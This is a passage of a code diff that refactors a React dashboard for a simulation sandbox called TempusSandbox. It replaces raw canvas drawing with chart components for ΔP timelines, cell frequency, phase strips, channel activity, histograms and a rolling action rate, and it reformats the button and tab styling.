       const last  = batch[batch.length - 1];
-      if (last) setLiveState({ phase: last.phase, cycle: last.M, lastDP: last.dp, activeCell: last.cell, lastAction: last.actionFired });
+      if (last) setLiveState({ phase:last.phase, cycle:last.M, lastDP:last.dp, activeCell:last.cell, lastAction:last.actionFired });
 
+      // action log entries
       const completions = batch.filter(e => e.actionFired !== null);
       if (completions.length > 0) {
-        const newEntries: ActionEntry[] = completions.map(e => ({
-          ts: nowStamp(), cell: e.cell, action: e.actionFired!,
-          dp: e.dp, color: colorsRef.current.get(e.cell) ?? ANOMALY,
-        }));
-        setActionLog(p => [...newEntries, ...p].slice(0, 80));
+        setActionLog(p => [
+          ...completions.map(e => ({ ts:nowStamp(), cell:e.cell, action:e.actionFired!, dp:e.dp, color: colorsRef.current.get(e.cell) ?? ANOMALY })),
+          ...p,
+        ].slice(0, 80));
       }
 
-      const evs = simRef.current.getEvents();
+      const evs    = simRef.current.getEvents();
+      const recent = evs.slice(-500);
+
+      // scatter points
+      setScatterPoints(recent.map(ev => ({
+        y:     ev.dp,
+        color: (colorsRef.current.get(ev.cell) ?? ANOMALY) + (ev.actionFired ? '' : 'a0'),
+        r:     ev.actionFired ? 3.5 : 1.8,
+      })));
+
+      // phase strip
+      setStripEntries(recent.map(ev => ({
+        color:   ev.phase === 'EXECUTE' ? '#f59e0b' : '#60a5fa',
+        opacity: ev.phase === 'EXECUTE' ? 0.8 : 0.38,
+      })));
+
+      // dp values for histogram
+      setDpValues(recent.map(ev => ev.dp));
+
+      // per-cell counts
       const cnts = new Map<string, number>();
       evs.forEach(ev => cnts.set(ev.cell, (cnts.get(ev.cell) ?? 0) + 1));
       setCellCounts(new Map(cnts));
-      setStats({ total: evs.length, dispatched: evs.filter(e => e.actionFired !== null).length,
-                 anomalies: evs.filter(e => e.cell === 'anomaly').length, done: simRef.current.isDone() });
-      redrawAll();
+
+      // channel bar data
+      const chanCnts = new Map<string, number>();
+      channelsRef.current.forEach(ch => chanCnts.set(ch, 0));
+      evs.forEach(ev => chanCnts.set(ev.channel, (chanCnts.get(ev.channel) ?? 0) + 1));
+      setChanBarData(channelsRef.current.map((ch, i) => ({
+        label: ch, value: chanCnts.get(ch) ?? 0, color: PALETTE[i % PALETTE.length],
+      })));
+
+      // rolling action rate
+      const WIN = 50;
+      const rateVals = recent.map((_, i) => {
+        const lo = Math.max(0, i - WIN + 1);
+        let cnt = 0;
+        for (let j = lo; j <= i; j++) if (recent[j].actionFired) cnt++;
+        return cnt / Math.min(i + 1, WIN);
+      });
+      setRateSeries([{ values: rateVals, color:'#58E6D9', fill:true }]);
+
+      setStats({ total:evs.length, dispatched:evs.filter(e => e.actionFired!==null).length,
+                 anomalies:evs.filter(e => e.cell==='anomaly').length, done:simRef.current.isDone() });
     }, 50);
     return () => { if (intervalRef.current) clearInterval(intervalRef.current); };
-  }, [running, redrawAll]);
-
-  // resize observer — wire all 6 canvases
-  useEffect(() => {
-    const canvases = Object.values(cvs).map(r => r.current).filter(Boolean) as HTMLCanvasElement[];
-    if (!canvases.length) return;
-    const ro = new ResizeObserver(() => redrawAll());
-    canvases.forEach(c => ro.observe(c));
-    return () => ro.disconnect();
-  }, [redrawAll]); // eslint-disable-line react-hooks/exhaustive-deps
+  }, [running]);
 
   const pct = nEvents > 0 ? Math.round((stats.total / nEvents) * 100) : 0;
 
-  // ── JSX ────────────────────────────────────────────────────────────────────
   return (
     <div style={{ background:'#030705', color:'#e2e8f0', height:'100vh',
                   fontFamily:'monospace', display:'flex', flexDirection:'column', overflow:'hidden' }}>
@@ -734,17 +467,17 @@ function TempusSandbox() {
         </span>
         <div style={{ marginLeft:'auto', display:'flex', gap:7 }}>
           {[
-            { label:'RUN ▶', fn: handleRun,  dis: running,
-              s: { background: running ? '#1a2a1a' : '#58E6D9', color: running ? '#445' : '#020f0d', border:'none', fontWeight:700 } },
-            { label:'STOP',  fn: handleStop, dis: !running,
-              s: { background:'transparent', color: !running ? 'rgba(255,255,255,0.15)' : '#ef4444',
-                   border:`1px solid ${!running ? 'rgba(255,255,255,0.07)' : '#ef4444'}` } },
-            { label:'RESET', fn: handleReset, dis: false,
-              s: { background:'transparent', color:'rgba(255,255,255,0.28)', border:'1px solid rgba(255,255,255,0.1)' } },
+            { label:'RUN ▶', fn:handleRun,  dis:running,
+              s:{ background:running ? '#1a2a1a' : '#58E6D9', color:running ? '#445' : '#020f0d', border:'none', fontWeight:700 } },
+            { label:'STOP',  fn:handleStop, dis:!running,
+              s:{ background:'transparent', color:!running?'rgba(255,255,255,0.15)':'#ef4444',
+                  border:`1px solid ${!running?'rgba(255,255,255,0.07)':'#ef4444'}` } },
+            { label:'RESET', fn:handleReset, dis:false,
+              s:{ background:'transparent', color:'rgba(255,255,255,0.28)', border:'1px solid rgba(255,255,255,0.1)' } },
           ].map(b => (
             <button key={b.label} onClick={b.fn} disabled={b.dis}
               style={{ padding:'5px 15px', fontSize:10, letterSpacing:'0.12em',
-                       cursor: b.dis ? 'not-allowed' : 'pointer', fontFamily:'monospace', ...b.s }}>
+                       cursor:b.dis?'not-allowed':'pointer', fontFamily:'monospace', ...b.s }}>
               {b.label}
             </button>
           ))}
@@ -759,13 +492,13 @@ function TempusSandbox() {
                       display:'flex', flexDirection:'column', overflow:'hidden' }}>
 
           <div style={{ display:'flex', borderBottom:'1px solid rgba(255,255,255,0.07)', flexShrink:0 }}>
-            {(['program', 'attack'] as const).map(tab => (
+            {(['program','attack'] as const).map(tab => (
               <button key={tab} onClick={() => setLeftTab(tab)}
                 style={{ flex:1, padding:'9px 6px', fontFamily:'monospace', fontSize:9,
                          letterSpacing:'0.14em', textTransform:'uppercase',
                          background:'transparent', border:'none', cursor:'pointer',
-                         borderBottom: leftTab === tab ? '2px solid #58E6D9' : '2px solid transparent',
-                         color: leftTab === tab ? '#58E6D9' : 'rgba(255,255,255,0.28)', transition:'all 0.12s' }}>
+                         borderBottom:leftTab===tab?'2px solid #58E6D9':'2px solid transparent',
+                         color:leftTab===tab?'#58E6D9':'rgba(255,255,255,0.28)', transition:'all 0.12s' }}>
                 {tab === 'attack' ? 'Structural Incorruptibility' : 'Program'}
               </button>
             ))}
@@ -808,14 +541,12 @@ function TempusSandbox() {
                                 width:`${pct}%`, transition:'width 0.1s' }} />
                 </div>
                 <div style={{ display:'grid', gridTemplateColumns:'repeat(4,1fr)', marginTop:7 }}>
-                  {[['EVENTS', `${stats.total}/${nEvents}`], ['DISPATCH', String(stats.dispatched)],
-                    ['ANOMALY', String(stats.anomalies)],    ['STATUS', stats.done ? 'DONE' : running ? 'RUN' : 'IDLE']
-                  ].map(([k, v]) => (
+                  {[['EVENTS',`${stats.total}/${nEvents}`],['DISPATCH',String(stats.dispatched)],
+                    ['ANOMALY',String(stats.anomalies)],['STATUS',stats.done?'DONE':running?'RUN':'IDLE']
+                  ].map(([k,v]) => (
                     <div key={k} style={{ textAlign:'center' }}>
                       <div style={{ fontSize:7, letterSpacing:'0.12em', color:'rgba(255,255,255,0.2)', textTransform:'uppercase' }}>{k}</div>
-                      <div style={{ fontSize:11, color: k==='STATUS' && running ? '#58E6D9' :
-                                                        k==='ANOMALY' && stats.anomalies > 0 ? '#ef4444' :
-                                                        'rgba(255,255,255,0.55)' }}>{v}</div>
+                      <div style={{ fontSize:11, color:k==='STATUS'&&running?'#58E6D9':k==='ANOMALY'&&stats.anomalies>0?'#ef4444':'rgba(255,255,255,0.55)' }}>{v}</div>
                     </div>
                   ))}
                 </div>
@@ -833,35 +564,30 @@ function TempusSandbox() {
         {/* ── RIGHT ── */}
         <div style={{ flex:1, display:'flex', flexDirection:'column', overflow:'hidden', minWidth:0 }}>
 
-          <StateStrip
-            phase={liveState.phase} cycle={liveState.cycle} lastDP={liveState.lastDP}
-            activeCell={liveState.activeCell} lastAction={liveState.lastAction} colors={colors}
-          />
+          <StateStrip phase={liveState.phase} cycle={liveState.cycle} lastDP={liveState.lastDP}
+            activeCell={liveState.activeCell} lastAction={liveState.lastAction} colors={colors} />
 
           {/*
-            6 canvas charts + cell registry + action log in a 3-col × 3-row grid:
-
-            Row 1: [ΔP Timeline ──── span 2 cols] [Cell Registry]
-            Row 2: [Cell Freq] [Phase Strip]       [Action Log]
-            Row 3: [Channel Activity] [ΔP Histo]  [Action Rate]
+            3 cols × 3 rows:
+              Row 1: [ΔP Timeline ── span 2] [Cell Registry]
+              Row 2: [Cell Freq]  [Phase Strip]  [Action Log]
+              Row 3: [Channel HBar]  [ΔP Histogram]  [Action Rate]
           */}
-          <div style={{
-            flex:1, display:'grid',
-            gridTemplateColumns:'1fr 1fr 230px',
-            gridTemplateRows:'1fr 1fr 1fr',
-            gap:1, background:'rgba(255,255,255,0.04)',
-            minHeight:0, overflow:'hidden',
-          }}>
-            {/* ΔP timeline — row 1, cols 1-2 */}
-            <div style={{ gridColumn:'1 / 3', gridRow:1, background:'#030705', overflow:'hidden' }}>
-              <canvas ref={cvs.dp} style={{ width:'100%', height:'100%', display:'block' }} />
+          <div style={{ flex:1, display:'grid',
+                        gridTemplateColumns:'1fr 1fr 230px',
+                        gridTemplateRows:'1fr 1fr 1fr',
+                        gap:1, background:'rgba(255,255,255,0.04)',
+                        minHeight:0, overflow:'hidden' }}>
+
+            {/* ΔP timeline */}
+            <div style={{ gridColumn:'1/3', gridRow:1, background:'#030705', overflow:'hidden' }}>
+              <CanvasScatter points={scatterPoints} bands={scatterBands} title="ΔP  TIMELINE" fmt={fmtDP} />
             </div>
 
-            {/* cell registry — row 1, col 3 */}
+            {/* cell registry */}
             <div style={{ gridColumn:3, gridRow:1, background:'#030705', overflow:'hidden' }}>
               {parsedProg ? (
-                <CellRegistry cells={parsedProg.cells} colors={colors}
-                  whens={parsedProg.whens} counts={cellCounts} activeCell={liveState.activeCell} />
+                <CellRegistry prog={parsedProg} colors={colors} counts={cellCounts} activeCell={liveState.activeCell} />
               ) : (
                 <div style={{ height:'100%', display:'flex', alignItems:'center', justifyContent:'center',
                               fontSize:9, color:'rgba(255,255,255,0.1)', fontStyle:'italic' }}>
@@ -870,34 +596,36 @@ function TempusSandbox() {
               )}
             </div>
 
-            {/* cell frequency bar — row 2, col 1 */}
+            {/* cell frequency */}
             <div style={{ gridColumn:1, gridRow:2, background:'#030705', overflow:'hidden' }}>
-              <canvas ref={cvs.cell} style={{ width:'100%', height:'100%', display:'block' }} />
+              <CanvasBar data={cellBarData} title="CELL  FREQUENCY" />
             </div>
 
-            {/* phase strip — row 2, col 2 */}
+            {/* phase strip */}
             <div style={{ gridColumn:2, gridRow:2, background:'#030705', overflow:'hidden' }}>
-              <canvas ref={cvs.phase} style={{ width:'100%', height:'100%', display:'block' }} />
+              <CanvasStrip entries={stripEntries} legend={STRIP_LEGEND} title="PHASE  TIMELINE" />
             </div>
 
-            {/* action log — row 2, col 3 */}
+            {/* action log */}
             <div style={{ gridColumn:3, gridRow:2, background:'#030705', overflow:'hidden' }}>
               <ActionLog entries={actionLog} />
             </div>
 
-            {/* channel activity — row 3, col 1 */}
+            {/* channel activity */}
             <div style={{ gridColumn:1, gridRow:3, background:'#030705', overflow:'hidden' }}>
-              <canvas ref={cvs.chan} style={{ width:'100%', height:'100%', display:'block' }} />
+              <CanvasHBar data={chanBarData} title="CHANNEL  ACTIVITY" />
             </div>
 
-            {/* ΔP histogram — row 3, col 2 */}
+            {/* ΔP histogram */}
             <div style={{ gridColumn:2, gridRow:3, background:'#030705', overflow:'hidden' }}>
-              <canvas ref={cvs.hist} style={{ width:'100%', height:'100%', display:'block' }} />
+              <CanvasHistogram values={dpValues} bands={histBands}
+                title="ΔP  HISTOGRAM" fmt={fmtDP} bins={40} />
             </div>
 
-            {/* action rate line — row 3, col 3 */}
+            {/* action rate */}
             <div style={{ gridColumn:3, gridRow:3, background:'#030705', overflow:'hidden' }}>
-              <canvas ref={cvs.rate} style={{ width:'100%', height:'100%', display:'block' }} />
+              <CanvasLine series={rateSeries} title="ACTION  RATE  (rolling)"
+                fmt={v => v.toFixed(2)} yMin={0} />
             </div>
           </div>
         </div>
